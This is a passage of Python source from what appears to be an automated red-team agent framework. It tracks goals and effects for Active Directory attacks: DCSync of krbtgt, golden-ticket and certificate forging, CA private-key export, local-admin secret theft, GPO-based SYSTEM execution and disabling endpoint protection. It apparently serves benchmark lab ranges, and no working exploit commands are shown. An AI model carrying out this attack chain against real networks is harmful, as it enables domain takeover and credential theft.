                "kerberos_logon_context is the post-import access proof; a normal callback ls/dir outside "
                "the builder's preflight/proof commands is not equivalent. For execute-as-local-admin, issue "
                "the remote execution command and verify its output first; if it already contains the target-side "
                "proof marker, record from that output and stop. Otherwise issue the returned proof-read command "
                "and verify with the expected_probe before recording achieved state."
                " For capabilities that return artifact/event/proof metadata, treat the command list as one "
                "effect transaction: validate structured setup artifacts before waiting, wait for delayed "
                "environment effects when an event command is present, and do not advance dependent goals until "
                "a final proof command verifies the required effect or returns a concrete blocker."
                " For adcs-ca-private-key-export, record achieved only when "
                "extract_adcs_ca_private_key_probe verifies CA metadata plus valid PFX/private-key material; "
                "a remote process success, metadata file, or failed export status is not enough."
                " For adcs-certificate-auth, stage the verified CA PFX on the callback, issue the returned "
                "certificate forge and PKINIT commands without /ptt, then record achieved only from the "
                "post-import service-proof command that verifies certificate-auth access in the isolated "
                "Kerberos context."
            ) if commands else "",
        }

    def _default_capability_target(self, name: str, intent: dict, inputs: dict) -> str:
        capability = self._capability_text(name).casefold()
        domain = self._capability_text(
            inputs.get("domain") or inputs.get("source_domain") or intent.get("domain") or intent.get("source_domain")
        ).casefold()
        if capability in {"dcsync-krbtgt", "dcsync-account"} and domain:
            raw_account = self._capability_text(
                intent.get("account") or intent.get("user")
                or inputs.get("account") or inputs.get("user") or inputs.get("target_account")
                or ("krbtgt" if capability == "dcsync-krbtgt" else "")
            ).casefold()
            account = self._canonical_credential_account(raw_account)
            if account:
                return f"domain={domain};account={account}"
        if capability == "forge-golden-ticket" and domain:
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("effect_domain") or intent.get("target_domain")
            ).casefold()
            return f"domain={domain};target_domain={target_domain}" if target_domain else f"domain={domain}"
        if capability == "ensure-kerberos-context":
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("effect_domain") or inputs.get("domain")
                or intent.get("target_domain") or intent.get("effect_domain") or intent.get("domain")
            ).casefold()
            source_domain = self._capability_text(
                inputs.get("source_domain") or intent.get("source_domain") or target_domain
            ).casefold()
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold()
            if target_domain:
                target = f"domain={target_domain}"
                if callback_id:
                    target += f";callback={callback_id}"
                if source_domain and source_domain != target_domain:
                    target += f";source_domain={source_domain}"
                return target
        if capability == "ensure-account-kerberos-context":
            domain = self._capability_text(inputs.get("domain") or inputs.get("realm") or intent.get("domain")).casefold()
            account = self._capability_text(
                inputs.get("account") or inputs.get("user") or inputs.get("principal")
                or intent.get("account") or intent.get("user") or intent.get("principal")
            ).casefold()
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold().lstrip("#")
            if domain and account:
                target = f"domain={domain};account={account}"
                if callback_id:
                    target += f";callback={callback_id}"
                return target
        if capability == "read-managed-local-admin-secret":
            account = self._capability_text(
                inputs.get("account") or inputs.get("user") or inputs.get("principal")
                or intent.get("account") or intent.get("user") or intent.get("principal")
            ).casefold()
            account_domain = self._capability_text(
                inputs.get("account_domain") or inputs.get("reader_domain") or inputs.get("principal_domain")
                or intent.get("account_domain") or intent.get("reader_domain") or intent.get("principal_domain")
            ).casefold()
            target_host = self._capability_host_short(
                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                or intent.get("target_host") or intent.get("host") or intent.get("computer")
            )
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            if not target_domain and target_host:
                _, target_domain = self._capability_host_domain(
                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
                )
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold().lstrip("#")
            if target_host and target_domain:
                target = f"target={target_host};target_domain={target_domain}"
                if account:
                    target = f"account={account};" + target
                if account_domain:
                    target = target.replace(f"account={account};", f"account={account};account_domain={account_domain};", 1)
                if callback_id:
                    target += f";callback={callback_id}"
                return target
        if capability == "use-managed-local-admin-secret":
            target_host = self._capability_host_short(
                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                or intent.get("target_host") or intent.get("host") or intent.get("computer")
            )
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            if not target_domain and target_host:
                _, target_domain = self._capability_host_domain(
                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
                )
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold().lstrip("#")
            if target_host and target_domain:
                target = f"target={target_host};target_domain={target_domain}"
                if callback_id:
                    target += f";callback={callback_id}"
                return target
        if capability == "execute-as-local-admin":
            target_host = self._capability_host_short(
                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                or intent.get("target_host") or intent.get("host") or intent.get("computer")
            )
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            if not target_domain and target_host:
                _, target_domain = self._capability_host_domain(
                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
                )
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold().lstrip("#")
            if target_host and target_domain:
                target = f"target={target_host};target_domain={target_domain}"
                if callback_id:
                    target += f";callback={callback_id}"
                return target
        if capability == "adcs-ca-private-key-export":
            target_host = self._capability_host_short(
                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                or intent.get("target_host") or intent.get("host") or intent.get("computer")
            )
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            if not target_domain and target_host:
                _, target_domain = self._capability_host_domain(
                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
                )
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold().lstrip("#")
            if target_host and target_domain:
                target = f"target={target_host};target_domain={target_domain}"
                if callback_id:
                    target += f";callback={callback_id}"
                return target
        if capability == "adcs-esc-certificate-enroll":
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            account = self._capability_text(
                inputs.get("account") or inputs.get("user") or inputs.get("principal")
                or intent.get("account") or intent.get("user") or intent.get("principal") or "administrator"
            ).casefold()
            ca_host = self._capability_host_short(inputs.get("ca_host") or inputs.get("target_host") or intent.get("ca_host") or intent.get("target_host"))
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold().lstrip("#")
            if target_domain and account:
                target = f"domain={target_domain};account={account}"
                if ca_host:
                    target += f";ca_host={ca_host}"
                if callback_id:
                    target += f";callback={callback_id}"
                return target
        if capability == "adcs-certificate-auth":
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            account = self._capability_text(
                inputs.get("account") or inputs.get("user") or inputs.get("principal")
                or intent.get("account") or intent.get("user") or intent.get("principal") or "administrator"
            ).casefold()
            ca_host = self._capability_host_short(inputs.get("ca_host") or intent.get("ca_host"))
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold().lstrip("#")
            if target_domain and account:
                target = f"domain={target_domain};account={account}"
                if ca_host:
                    target += f";ca_host={ca_host}"
                if callback_id:
                    target += f";callback={callback_id}"
                return target
        if capability == "endpoint-protection-adjustment":
            target_host = self._capability_host_short(
                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                or intent.get("target_host") or intent.get("host") or intent.get("computer")
            )
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            if not target_domain and target_host:
                _, target_domain = self._capability_host_domain(
                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
                )
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold().lstrip("#")
            if target_host and target_domain:
                target = f"target={target_host};target_domain={target_domain}"
                if callback_id:
                    target += f";callback={callback_id}"
                return target
        if capability == "grant-directory-rights" and domain:
            source = self._capability_text(intent.get("execution_context") or inputs.get("execution_context"))
            return f"domain={domain};source={source}" if source else f"domain={domain}"
        if capability == "gpo-controlled-system-exec":
            gpo = self._capability_text(
                intent.get("gpo")
                or intent.get("gpo_name")
                or intent.get("gponame")
                or intent.get("gpo_display_name")
                or inputs.get("gpo")
                or inputs.get("gpo_name")
                or inputs.get("gponame")
                or inputs.get("gpo_display_name")
            )
            if gpo and domain:
                return f"gpo={gpo};domain={domain}"
        return self._capability_text(inputs.get("target"))

    def _default_capability_effects(self, name: str, intent: dict, inputs: dict) -> list[str]:
        capability = self._capability_text(name).casefold()
        domain = self._capability_text(
            inputs.get("domain") or inputs.get("source_domain") or intent.get("domain") or intent.get("source_domain")
        ).casefold()
        if capability in {"dcsync-krbtgt", "dcsync-account"} and domain:
            raw_account = self._capability_text(
                intent.get("account") or intent.get("user")
                or inputs.get("account") or inputs.get("user") or inputs.get("target_account")
                or ("krbtgt" if capability == "dcsync-krbtgt" else "")
            ).casefold()
            account = self._canonical_credential_account(raw_account)
            if capability == "dcsync-krbtgt" or account == "krbtgt":
                return [f"krbtgt-hash:{domain}"]
            if account:
                return [f"creds:{account}@{domain}"]
        if capability == "forge-golden-ticket" and domain:
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("effect_domain") or intent.get("target_domain")
            ).casefold()
            if not target_domain and (inputs.get("extra_sids") or inputs.get("parent_domain_sid")):
                target_domain = self._parent_domain_for_capability(domain)
            return [f"da:{target_domain or domain}"]
        if capability == "ensure-kerberos-context":
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("effect_domain") or inputs.get("domain")
                or intent.get("target_domain") or intent.get("effect_domain") or intent.get("domain")
            ).casefold()
            source_domain = self._capability_text(
                inputs.get("source_domain") or intent.get("source_domain") or target_domain
            ).casefold()
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold()
            if target_domain and callback_id:
                effects = []
                if source_domain and source_domain != target_domain:
                    effects.append(f"da:{target_domain}")
                effects.append(f"kerberos-context:{target_domain}@callback:{callback_id}")
                return effects
        if capability == "ensure-account-kerberos-context":
            domain = self._capability_text(inputs.get("domain") or inputs.get("realm") or intent.get("domain")).casefold()
            account = self._capability_text(
                inputs.get("account") or inputs.get("user") or inputs.get("principal")
                or intent.get("account") or intent.get("user") or intent.get("principal")
            ).casefold()
            callback_id = self._capability_text(
                inputs.get("callback_id") or inputs.get("callback") or intent.get("callback_id") or intent.get("callback")
            ).casefold().lstrip("#")
            if domain and account and callback_id:
                return [f"kerberos-account-context:{account}@{domain}@callback:{callback_id}"]
        if capability == "read-managed-local-admin-secret":
            target_host = self._capability_host_short(
                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                or intent.get("target_host") or intent.get("host") or intent.get("computer")
            )
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            if not target_domain and target_host:
                _, target_domain = self._capability_host_domain(
                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
                )
            if target_host and target_domain:
                return [f"managed-local-admin-secret:{target_host}@{target_domain}"]
        if capability == "use-managed-local-admin-secret":
            target_host = self._capability_host_short(
                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                or intent.get("target_host") or intent.get("host") or intent.get("computer")
            )
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            if not target_domain and target_host:
                _, target_domain = self._capability_host_domain(
                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
                )
            if target_host and target_domain:
                return [
                    f"local-admin:{target_host}@{target_domain}",
                    f"admin:{target_host}",
                    f"system-or-admin:{target_host}",
                ]
        if capability == "execute-as-local-admin":
            target_host = self._capability_host_short(
                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                or intent.get("target_host") or intent.get("host") or intent.get("computer")
            )
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            if not target_domain and target_host:
                _, target_domain = self._capability_host_domain(
                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
                )
            if target_host and target_domain:
                return [
                    f"remote-exec:{target_host}@{target_domain}",
                    f"host-exec:{target_host}",
                ]
        if capability == "adcs-ca-private-key-export":
            target_host = self._capability_host_short(
                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                or intent.get("target_host") or intent.get("host") or intent.get("computer")
            )
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            if not target_domain and target_host:
                _, target_domain = self._capability_host_domain(
                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
                )
            if target_host and target_domain:
                return [
                    f"adcs-ca-private-key:{target_host}@{target_domain}",
                    f"adcs-ca:{target_host}@{target_domain}",
                ]
        if capability == "adcs-esc-certificate-enroll":
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            account = self._capability_text(
                inputs.get("account") or inputs.get("user") or inputs.get("principal")
                or intent.get("account") or intent.get("user") or intent.get("principal") or "administrator"
            ).casefold()
            if target_domain and account:
                return [f"adcs-enrolled-certificate:{account}@{target_domain}"]
        if capability == "adcs-certificate-auth":
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            account = self._capability_text(
                inputs.get("account") or inputs.get("user") or inputs.get("principal")
                or intent.get("account") or intent.get("user") or intent.get("principal") or "administrator"
            ).casefold()
            if target_domain and account:
                return [
                    f"da:{target_domain}",
                    f"certificate-auth:{account}@{target_domain}",
                ]
        if capability == "endpoint-protection-adjustment":
            target_host = self._capability_host_short(
                inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                or intent.get("target_host") or intent.get("host") or intent.get("computer")
            )
            target_domain = self._capability_text(
                inputs.get("target_domain") or inputs.get("domain") or intent.get("target_domain") or intent.get("domain")
            ).casefold()
            if not target_domain and target_host:
                _, target_domain = self._capability_host_domain(
                    inputs.get("target_host") or inputs.get("host") or inputs.get("computer")
                    or intent.get("target_host") or intent.get("host") or intent.get("computer")
                )
            if target_host and target_domain:
                return [f"endpoint-protection-adjusted:{target_host}@{target_domain}"]
        if capability == "grant-directory-rights" and domain:
            return [f"ds-replication-rights:{domain}"]
        if capability == "gpo-controlled-system-exec" and domain:
            gpo = self._capability_text(
                intent.get("gpo")
                or intent.get("gpo_name")
                or intent.get("gponame")
                or intent.get("gpo_display_name")
                or inputs.get("gpo")
                or inputs.get("gpo_name")
                or inputs.get("gponame")
                or inputs.get("gpo_display_name")
            )
            if gpo:
                return [f"system-exec:gpo:{gpo}@{domain}"]
        return []

    def _capability_domain(self, action, inputs: dict) -> str:
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        target_fields = {}
        try:
            for part in self._capability_text(getattr(action, "target", "")).split(";"):
                if "=" in part:
                    key, value = part.split("=", 1)
                    target_fields[key.strip().casefold()] = value.strip()
        except Exception:
            target_fields = {}
        return self._capability_text(
            inputs.get("domain") or inputs.get("source_domain") or intent.get("domain") or
            intent.get("source_domain") or target_fields.get("domain")
        ).casefold()

    def _capability_source_domain(self, action, inputs: dict) -> str:
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        target_fields = {}
        try:
            for part in self._capability_text(getattr(action, "target", "")).split(";"):
                if "=" in part:
                    key, value = part.split("=", 1)
                    target_fields[key.strip().casefold()] = value.strip()
        except Exception:
            target_fields = {}
        return self._capability_text(
            inputs.get("source_domain") or inputs.get("forge_domain") or intent.get("source_domain")
            or target_fields.get("source_domain") or inputs.get("domain") or intent.get("domain")
            or target_fields.get("domain")
        ).casefold()

    def _capability_target_domain(self, action, inputs: dict) -> str:
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        target_fields = {}
        try:
            for part in self._capability_text(getattr(action, "target", "")).split(";"):
                if "=" in part:
                    key, value = part.split("=", 1)
                    target_fields[key.strip().casefold()] = value.strip()
        except Exception:
            target_fields = {}
        return self._capability_text(
            inputs.get("target_domain") or inputs.get("effect_domain") or intent.get("target_domain") or
            intent.get("effect_domain") or target_fields.get("target_domain")
        ).casefold()

    def _cross_domain_forge_parent(self, action, inputs: dict) -> str:
        """The PARENT domain of a SAME-FOREST child->parent forge-golden-ticket, else "". Same-forest only: the
        parent must be a DNS suffix of the child (child.root.example.local -> root.example.local). A
        cross-FOREST target (other.example.local) has no implicit Enterprise-Admins path to the parent and must never be
        granted replication rights — so it returns "" and the DCSync precheck still applies."""
        if self._capability_text(getattr(action, "name", "")).casefold() != "forge-golden-ticket":
            return ""
        child = self._capability_domain(action, inputs).strip(".")
        parent = self._capability_target_domain(action, inputs).strip(".")
        if not child or not parent or child == parent:
            return ""
        return parent if child.endswith("." + parent) else ""

    def _capability_account(self, action, inputs: dict) -> str:
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        target_fields = {}
        try:
            for part in self._capability_text(getattr(action, "target", "")).split(";"):
                if "=" in part:
                    key, value = part.split("=", 1)
                    target_fields[key.strip().casefold()] = value.strip()
        except Exception:
            target_fields = {}
        return self._canonical_credential_account(
            inputs.get("account") or inputs.get("user") or inputs.get("principal")
            or intent.get("account") or intent.get("user") or intent.get("principal")
            or target_fields.get("account") or target_fields.get("user") or target_fields.get("principal")
        )

    def _canonical_credential_account(self, value) -> str:
        account = self._capability_text(value).strip().casefold()
        if "\\" in account:
            account = account.rsplit("\\", 1)[1].strip()
        if "@" in account:
            account = account.split("@", 1)[0].strip()
        return account

    def _capability_account_domain(self, action, inputs: dict) -> str:
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        target_fields = {}
        try:
            for part in self._capability_text(getattr(action, "target", "")).split(";"):
                if "=" in part:
                    key, value = part.split("=", 1)
                    target_fields[key.strip().casefold()] = value.strip()
        except Exception:
            target_fields = {}
        account = self._capability_text(
            inputs.get("account") or inputs.get("user") or inputs.get("principal")
            or intent.get("account") or intent.get("user") or intent.get("principal")
            or target_fields.get("account") or target_fields.get("user") or target_fields.get("principal")
        )
        explicit = self._capability_text(
            inputs.get("account_domain") or inputs.get("reader_domain") or inputs.get("principal_domain")
            or intent.get("account_domain") or intent.get("reader_domain") or intent.get("principal_domain")
            or target_fields.get("account_domain") or target_fields.get("reader_domain")
            or target_fields.get("principal_domain")
        ).casefold()
        if explicit:
            return explicit
        if "@" in account:
            return account.rsplit("@", 1)[1].casefold()
        return ""

    def _capability_account_context_domain(self, action, inputs: dict) -> str:
        """Resolve the account's home realm consistently across record, probe, and reuse paths."""
        return self._capability_account_domain(action, inputs) or self._capability_domain(action, inputs)

    def _capability_local_account(self, action, inputs: dict) -> str:
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        target_fields = {}
        try:
            for part in self._capability_text(getattr(action, "target", "")).split(";"):
                if "=" in part:
                    key, value = part.split("=", 1)
                    target_fields[key.strip().casefold()] = value.strip()
        except Exception:
            target_fields = {}
        return self._capability_text(
            inputs.get("local_account") or inputs.get("local_user") or inputs.get("username")
            or intent.get("local_account") or intent.get("local_user") or intent.get("username")
            or target_fields.get("local_account") or target_fields.get("local_user") or "Administrator"
        )

    def _capability_target_host(self, action, inputs: dict) -> str:
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        target_fields = {}
        try:
            for part in self._capability_text(getattr(action, "target", "")).split(";"):
                if "=" in part:
                    key, value = part.split("=", 1)
                    target_fields[key.strip().casefold()] = value.strip()
        except Exception:
            target_fields = {}
        return self._capability_host_short(
            inputs.get("target_host") or inputs.get("host") or inputs.get("computer") or inputs.get("target")
            or intent.get("target_host") or intent.get("host") or intent.get("computer") or intent.get("target")
            or target_fields.get("target_host") or target_fields.get("host") or target_fields.get("computer")
            or target_fields.get("target")
        )

    def _capability_managed_secret_target_domain(self, action, inputs: dict) -> str:
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        target_fields = {}
        try:
            for part in self._capability_text(getattr(action, "target", "")).split(";"):
                if "=" in part:
                    key, value = part.split("=", 1)
                    target_fields[key.strip().casefold()] = value.strip()
        except Exception:
            target_fields = {}
        explicit = self._capability_text(
            inputs.get("target_domain") or intent.get("target_domain") or target_fields.get("target_domain")
            or inputs.get("domain") or intent.get("domain") or target_fields.get("domain")
        ).casefold()
        if explicit:
            return explicit
        _, domain = self._capability_host_domain(
            inputs.get("target_host") or inputs.get("host") or inputs.get("computer") or inputs.get("target")
            or intent.get("target_host") or intent.get("host") or intent.get("computer") or intent.get("target")
            or target_fields.get("target_host") or target_fields.get("host") or target_fields.get("computer")
            or target_fields.get("target")
        )
        return domain

    def _capability_callback_id(self, action, inputs: dict) -> str:
        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        target_fields = {}
        try:
            for part in self._capability_text(getattr(action, "target", "")).split(";"):
                if "=" in part:
                    key, value = part.split("=", 1)
                    target_fields[key.strip().casefold()] = value.strip()
        except Exception:
            target_fields = {}
        callback_id = self._capability_text(
            inputs.get("callback_id") or inputs.get("callback") or inputs.get("callback_display_id")
            or intent.get("callback_id") or intent.get("callback") or intent.get("callback_display_id")
            or target_fields.get("callback") or target_fields.get("callback_id")
        ).casefold().lstrip("#")
        if callback_id.startswith("cb") and callback_id[2:].isdigit():
            return callback_id[2:]
        return callback_id

    def _capability_target_host_from_context(self, context: dict) -> str:
        action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
        intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
        return self._capability_host_short(intent.get("target_host") or intent.get("host") or self._target_field(context, "target"))

    def _capability_target_domain_from_context(self, context: dict) -> str:
        action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
        intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
        explicit = self._capability_text(intent.get("target_domain") or intent.get("domain") or self._target_field(context, "target_domain")).casefold()
        if explicit:
            return explicit
        _, domain = self._capability_host_domain(intent.get("target_host") or intent.get("host") or self._target_field(context, "target"))
        return domain

    def _target_field(self, context: dict, key: str) -> str:
        try:
            target = self._capability_text(context.get("target"))
            for part in target.split(";"):
                if "=" not in part:
                    continue
                field, value = part.split("=", 1)
                if field.strip().casefold() == key:
                    return value.strip()
        except Exception:
            return ""
        return ""

    def _capability_has_ticket_key(self, inputs: dict) -> bool:
        for key in ("aes256", "aes128", "rc4", "ntlm", "nthash", "krbtgt_hash", "key", "krbtgt_key"):
            if self._capability_text(inputs.get(key)).strip():
                return True
        return False

    def _capability_host_domain(self, value) -> tuple[str, str]:
        host = self._capability_text(value).strip().strip("\\/")
        if not host:
            return "", ""
        if "/" in host and not host.startswith("\\\\"):
            _, _, host = host.partition("/")
        if "@" in host:
            host = host.split("@", 1)[0]
        host = host.rstrip(".")
        if host.endswith("$"):
            host = host[:-1]
        parts = [part for part in host.casefold().split(".") if part]
        if len(parts) >= 3:
            return parts[0], ".".join(parts[1:])
        return host.split(".", 1)[0].casefold(), ""

    def _capability_host_short(self, value) -> str:
        host, _domain = self._capability_host_domain(value)
        if host:
            return host
        text = self._capability_text(value).strip().strip("\\/")
        if not text:
            return ""
        if "@" in text:
            text = text.split("@", 1)[0]
        if text.endswith("$"):
            text = text[:-1]
        return text.split(".", 1)[0].casefold()

    def _capability_host_name(self, value: str, domain: str = "") -> str:
        host = self._capability_text(value).strip().strip("\\/")
        if not host:
            return ""
        if "/" in host and not host.startswith("\\\\"):
            service, _, remainder = host.partition("/")
            if service.strip() and remainder.strip():
                host = remainder.strip()
        if "@" in host:
            host = host.split("@", 1)[0]
        host = host.rstrip(".")
        if host.endswith("$"):
            host = host[:-1]
        if "." not in host and domain:
            host = f"{host}.{self._capability_text(domain).strip().strip('.')}"
        return host

    def _gpo_dedicated_proof_target(
        self,
        *,
        domain: str,
        gpo: str,
        current_host: str,
        affected_hosts: set[str],
        affected_dc_hosts: set[str],
    ) -> tuple[str, str] | None:
        """Return a local-write/UNC-read proof pair for one remote non-DC GPO target.

        This is opt-in runtime plumbing for benchmark ranges that provision a read-only proof share. It keeps
        the SYSTEM task's write local to the affected host while giving the callback a separate readable path.
        """
        share = self._capability_text(os.environ.get("SAGE_GPO_PROOF_SHARE_NAME")).strip()
        local_root = self._capability_text(os.environ.get("SAGE_GPO_PROOF_LOCAL_ROOT")).strip().replace("/", "\\")
        if (
            not domain
            or not current_host
            or not share
            or not local_root
            or affected_dc_hosts
            or not _re_mod.fullmatch(r"[A-Za-z0-9_$-]+", share)
            or not _re_mod.match(r"^[A-Za-z]:\\", local_root)
            or any(ch in local_root for ch in "\r\n\"'&|<>")
        ):
            return None
        remote_hosts = sorted(host for host in affected_hosts if host and host != current_host)
        if len(remote_hosts) != 1:
            return None
        target_host = self._capability_host_name(remote_hosts[0], domain)
        if not target_host:
            return None
        filename = f"sage_gpo_{self._capability_slug(gpo or target_host)}_whoami.txt"
        proof_path = local_root.rstrip("\\") + "\\" + filename
        proof_unc = f"\\\\{target_host}\\{share}\\{filename}"
        return proof_path, proof_unc

    def _capability_unc_from_windows_path(self, host: str, path: str) -> str:
        host_text = self._capability_text(host).strip().strip("\\/")
        path_text = self._capability_text(path).strip().replace("/", "\\")
        drive_unc = _re_mod.match(r"^\\+([^\\]+)\\([a-zA-Z])\$(?:\\(.*))?$", path_text)
        if drive_unc:
            unc_host = drive_unc.group(1).strip().strip("\\/")
            drive = drive_unc.group(2).upper()
            tail = (drive_unc.group(3) or "").strip("\\/")
            return f"\\\\{unc_host}\\{drive}$" + (f"\\{tail}" if tail else "")
        if path_text.startswith("\\\\"):
            return "\\\\" + path_text.lstrip("\\")
        drive, sep, tail = path_text.partition(":")
        if sep and len(drive) == 1:
            tail = tail.lstrip("\\/")
            return f"\\\\{host_text}\\{drive.upper()}$\\{tail}"
        normalized = path_text.lstrip("\\/")
        return f"\\\\{host_text}\\C$\\{normalized}"

    def _capability_slug(self, value) -> str:
        text = _re_mod.sub(r"[^a-zA-Z0-9]+", "_", self._capability_text(value).strip().lower())
        text = _re_mod.sub(r"_+", "_", text).strip("_")
        return text or "target"

    def _kerberos_account_context_key(self, callback_display_id, account: str, domain: str) -> tuple:
        return (
            str(callback_display_id),
            self._capability_text(account).casefold(),
            self._capability_text(domain).casefold(),
        )

    def _callback_current_identity_matches_account_context(
        self,
        callback_display_id,
        account: str,
        domain: str,
    ) -> bool:
        callback_id = self._capability_text(callback_display_id).casefold().lstrip("#")
        account_cf = self._canonical_credential_account(account)
        domain_cf = self._capability_text(domain).casefold()
        if not callback_id or not account_cf or not domain_cf:
            return False
        for foothold in list(getattr(self, "_engagement_footholds", []) or []):
            if getattr(foothold, "alive", False) is not True:
                continue
            if self._capability_text(getattr(foothold, "agent", "")).casefold() == "sage":
                continue
            foothold_callback = self._capability_text(getattr(foothold, "callback_id", "")).casefold().lstrip("#")
            if foothold_callback != callback_id:
                continue
            identity_account = self._canonical_credential_account(getattr(foothold, "identity", ""))
            foothold_domain = self._capability_text(getattr(foothold, "forest", "")).casefold()
            identity_domain = self._callback_identity_domain(getattr(foothold, "identity", ""))
            if (
                identity_account == account_cf
                and foothold_domain == domain_cf
                and (not identity_domain or self._callback_domains_equivalent(identity_domain, foothold_domain))
            ):
                return True
        return False

    def _callback_identity_domain(self, identity) -> str:
        text = self._capability_text(identity).strip()
        if "\\" in text:
            return text.split("\\", 1)[0].strip().casefold()
        if "@" in text:
            return text.rsplit("@", 1)[1].strip().casefold()
        return ""

    def _callback_domains_equivalent(self, left: str, right: str) -> bool:
        left_cf = self._capability_text(left).strip().casefold()
        right_cf = self._capability_text(right).strip().casefold()
        if not left_cf or not right_cf:
            return False
        if left_cf == right_cf:
            return True
        if "." not in left_cf and "." in right_cf:
            return left_cf == right_cf.split(".", 1)[0]
        if "." not in right_cf and "." in left_cf:
            return right_cf == left_cf.split(".", 1)[0]
        return False

    def _callback_has_local_admin_logon_context(
        self,
        callback_display_id,
        target_host: str,
        target_domain: str,
        local_account: str,
    ) -> bool:
        try:
            callback_id = int(self._capability_text(callback_display_id).lstrip("#"))
        except (TypeError, ValueError):
            return False
        account_cf = self._canonical_credential_account(local_account)
        host_cf = self._capability_text(target_host).strip().casefold()
        fqdn_cf = self._capability_host_name(target_host, target_domain).casefold()
        if not account_cf or not host_cf:
            return False
        for key in getattr(self, "_kerberos_logon_context_keys", set()):
            if not isinstance(key, tuple) or len(key) < 4:
